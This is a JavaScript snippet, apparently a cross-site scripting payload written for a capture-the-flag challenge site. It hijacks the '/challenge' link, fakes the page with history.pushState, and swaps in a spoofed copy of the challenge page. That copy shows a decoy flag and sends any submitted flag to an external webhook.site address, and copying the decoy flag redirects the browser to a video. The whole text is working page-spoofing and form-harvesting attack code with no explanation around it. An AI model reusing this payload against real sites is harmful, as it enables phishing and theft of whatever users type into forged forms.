
(() => {
    const webhook =
        'https://webhook.site/67909b69-79e2-46cd-8eb1-bf3cbfddac04';

    const link = document.querySelector('a[href="/challenge"]');
    if (!link) return;

    link.addEventListener('click', e => {
        e.preventDefault();
        e.stopImmediatePropagation();

        // Preserve the JavaScript context
        history.pushState({}, '', '/challenge');

        // Replicate the original Challenge page content
        document.querySelector('.content').innerHTML = `
            <h2>Challenge</h2>

            <fieldset>
                <h3>Sanity Check</h3>

                <p>Welcome! Flag is <!-- not -->
                    <code>firebird{B0ku_no_YAkl7OrI_CHaN}</code>
                </p>

                <form action="${webhook}" method="GET">
                    <p>Flag:
                        <input name="flag"
                               autocomplete="off"
                               placeholder="firebird{...}">
                    </p>

                    <input type="hidden" name="id" value="1">
                    <input type="submit" class="submit-flag">
                </form>
            </fieldset>

            <br><br>

            <fieldset>
                <h3>Lay's gender</h3>

                <p>If you lay, then do you lay?
                   If you do not lay, then do you not lay?</p>

                <form action="${webhook}" method="GET">
                    <div class="solved">Solved</div>
                </form>
            </fieldset>
        `;

        // Restore the original code element's oncopy behavior
        const code = document.querySelector('.content code');

        code.oncopy = () => {
            location.href =
                'https://www.youtube.com/watch?v=0f3RrvC-zGI';
        };
    }, true);
})();
